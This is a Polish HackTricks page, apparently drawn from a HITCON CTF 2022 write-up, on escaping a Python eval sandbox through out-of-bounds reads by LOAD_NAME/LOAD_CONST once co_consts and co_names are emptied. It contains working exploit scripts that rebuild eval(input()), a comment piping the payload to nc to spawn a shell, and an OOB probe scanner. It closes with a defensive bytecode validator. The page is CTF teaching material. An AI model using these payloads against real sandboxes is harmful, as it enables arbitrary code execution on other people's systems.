# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

**Te informacje zostały wzięte** [**z tego opisu**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Możemy użyć funkcji OOB read w opcode LOAD_NAME / LOAD_CONST, aby uzyskać jakiś symbol w pamięci. Co oznacza użycie sztuczki takiej jak `(a, b, c, ... setki symboli ..., __getattribute__) if [] else [].__getattribute__(...)`, aby uzyskać symbol (taki jak nazwa funkcji), którego chcesz.

Następnie po prostu stwórz swój exploit.

### Overview <a href="#overview-1" id="overview-1"></a>

Kod źródłowy jest dość krótki, zawiera tylko 4 linie!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
Możesz wprowadzić dowolny kod Pythona, a zostanie on skompilowany do [obiektu kodu Pythona](https://docs.python.org/3/c-api/code.html). Jednak `co_consts` i `co_names` tego obiektu kodu zostaną zastąpione pustą krotką przed ewaluacją tego obiektu kodu.

W ten sposób wszystkie wyrażenia zawierające stałe (np. liczby, ciągi itp.) lub nazwy (np. zmienne, funkcje) mogą ostatecznie spowodować błąd segmentacji.

### Odczyt poza zakresem <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Jak dochodzi do błędu segmentacji?

Zacznijmy od prostego przykładu, `[a, b, c]` może zostać skompilowane do następującego kodu bajtowego.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Ale co jeśli `co_names` stanie się pustą krotką? Opcode `LOAD_NAME 2` nadal jest wykonywany i próbuje odczytać wartość z tego adresu pamięci, z którego pierwotnie powinien być odczyt. Tak, to jest "cecha" odczytu poza zakresem.

Podstawowa koncepcja rozwiązania jest prosta. Niektóre opcodes w CPython, na przykład `LOAD_NAME` i `LOAD_CONST`, są podatne (?) na odczyt poza zakresem.

Odczytują obiekt z indeksu `oparg` z krotki `consts` lub `names` (to jest to, co `co_consts` i `co_names` nazywają pod maską). Możemy odwołać się do poniższego krótkiego fragmentu dotyczącego `LOAD_CONST`, aby zobaczyć, co CPython robi, gdy przetwarza opcode `LOAD_CONST`.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
W ten sposób możemy użyć funkcji OOB, aby uzyskać "name" z dowolnego przesunięcia pamięci. Aby upewnić się, jaką ma nazwę i jakie jest jej przesunięcie, po prostu próbuj `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... A możesz znaleźć coś przy oparg > 700. Możesz także spróbować użyć gdb, aby przyjrzeć się układowi pamięci, oczywiście, ale nie sądzę, żeby to było łatwiejsze?

### Generating the Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Gdy już odzyskamy te przydatne przesunięcia dla nazw / stałych, jak _zdobijemy_ nazwę / stałą z tego przesunięcia i użyjemy jej? Oto sztuczka dla Ciebie:\
Załóżmy, że możemy uzyskać nazwę `__getattribute__` z przesunięcia 5 (`LOAD_NAME 5`) z `co_names=()`, wtedy po prostu zrób następujące rzeczy:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Zauważ, że nie jest konieczne nazywanie tego `__getattribute__`, możesz nadać mu krótszą lub bardziej dziwną nazwę.

Możesz zrozumieć powód, po prostu oglądając jego bajtowy kod:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Zauważ, że `LOAD_ATTR` również pobiera nazwę z `co_names`. Python ładuje nazwy z tej samej pozycji, jeśli nazwa jest taka sama, więc drugi `__getattribute__` jest nadal ładowany z offsetu=5. Używając tej funkcji, możemy użyć dowolnej nazwy, gdy tylko nazwa znajduje się w pamięci w pobliżu.

Generowanie liczb powinno być trywialne:

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

Nie użyłem consts z powodu limitu długości.

Najpierw oto skrypt, który pomoże nam znaleźć te offsety nazw.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
A poniżej znajduje się kod do generowania prawdziwego exploita w Pythonie.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
W zasadzie wykonuje następujące czynności, dla tych ciągów uzyskujemy je z metody `__dir__`:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Notatki wersji i dotknięte opcodes (Python 3.11–3.13)

- Opcode'y bajtowe CPython nadal indeksują krotki `co_consts` i `co_names` za pomocą operandów całkowitych. Jeśli atakujący może wymusić, aby te krotki były puste (lub mniejsze niż maksymalny indeks używany przez bajtowy kod), interpreter odczyta pamięć poza zakresem dla tego indeksu, co da wskaźnik PyObject z pobliskiej pamięci. Odpowiednie opcode'y obejmują przynajmniej:
- `LOAD_CONST consti` → odczytuje `co_consts[consti]`.
- `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`, `STORE_ATTR` → odczytują nazwy z `co_names[...]` (dla 3.11+ zauważ, że `LOAD_ATTR`/`LOAD_GLOBAL` przechowują flagi w niskim bicie; rzeczywisty indeks to `namei >> 1`). Zobacz dokumentację disassemblera dla dokładnej semantyki w każdej wersji. [Python dis docs].
- Python 3.11+ wprowadził adaptacyjne/inline cache, które dodają ukryte wpisy `CACHE` między instrukcjami. To nie zmienia OOB primitive; oznacza to tylko, że jeśli ręcznie tworzysz bajtowy kod, musisz uwzględnić te wpisy cache podczas budowania `co_code`.

Praktyczne implikacje: technika opisana na tej stronie nadal działa w CPython 3.11, 3.12 i 3.13, gdy możesz kontrolować obiekt kodu (np. za pomocą `CodeType.replace(...)`) i zmniejszyć `co_consts`/`co_names`.

### Szybki skaner dla użytecznych indeksów OOB (kompatybilny z 3.11+/3.12+)

Jeśli wolisz badać interesujące obiekty bezpośrednio z bajtowego kodu, a nie z kodu źródłowego na wyższym poziomie, możesz generować minimalne obiekty kodu i przeprowadzać brute force indeksy. Poniższy pomocnik automatycznie wstawia inline cache, gdy jest to potrzebne.
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Notes
- Aby zamiast tego badać nazwy, zamień `LOAD_CONST` na `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` i dostosuj użycie stosu odpowiednio.
- Użyj `EXTENDED_ARG` lub wielu bajtów `arg`, aby osiągnąć indeksy >255, jeśli to konieczne. Podczas budowania z `dis` jak powyżej, kontrolujesz tylko niski bajt; dla większych indeksów skonstruuj surowe bajty samodzielnie lub podziel atak na wiele ładowań.

### Minimalny wzór RCE tylko z bajtów (co_consts OOB → builtins → eval/input)

Gdy zidentyfikujesz indeks `co_consts`, który odnosi się do modułu builtins, możesz odtworzyć `eval(input())` bez żadnych `co_names`, manipulując stosem:
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
To podejście jest przydatne w wyzwaniach, które dają bezpośrednią kontrolę nad `co_code`, jednocześnie wymuszając `co_consts=()` i `co_names=()` (np. BCTF 2024 “awpcode”). Unika sztuczek na poziomie źródła i utrzymuje mały rozmiar ładunku, wykorzystując operacje stosu bajtowego i budowniczych krotek.

### Sprawdzanie defensywne i łagodzenia dla piaskownic

Jeśli piszesz "piaskownicę" w Pythonie, która kompiluje/ocenia nieufny kod lub manipuluje obiektami kodu, nie polegaj na CPython w sprawdzaniu granic indeksów krotek używanych przez bajtowy kod. Zamiast tego, samodzielnie waliduj obiekty kodu przed ich wykonaniem.

Praktyczny walidator (odrzuca dostęp OOB do co_consts/co_names)
```python
import dis

def max_name_index(code):
max_idx = -1
for ins in dis.get_instructions(code):
if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
"IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
namei >>= 1
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname == "LOAD_CONST"] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
Dodatkowe pomysły na łagodzenie

- Nie pozwalaj na dowolne `CodeType.replace(...)` na niezaufanym wejściu, lub dodaj ścisłe kontrole strukturalne na wynikowym obiekcie kodu.
- Rozważ uruchamianie niezaufanego kodu w osobnym procesie z użyciem sandboxingu na poziomie systemu operacyjnego (seccomp, obiekty zadań, kontenery) zamiast polegać na semantyce CPython.

## Odniesienia

- Artykuł Splitline’a z HITCON CTF 2022 „V O I D” (pochodzenie tej techniki i ogólny łańcuch exploitów): https://blog.splitline.tw/hitcon-ctf-2022/
- Dokumentacja dezasemblatora Pythona (semantyka indeksów dla LOAD_CONST/LOAD_NAME/itd., oraz niskobitowe flagi `LOAD_ATTR`/`LOAD_GLOBAL` w wersji 3.11+): https://docs.python.org/3.13/library/dis.html
{{#include ../../../banners/hacktricks-training.md}}
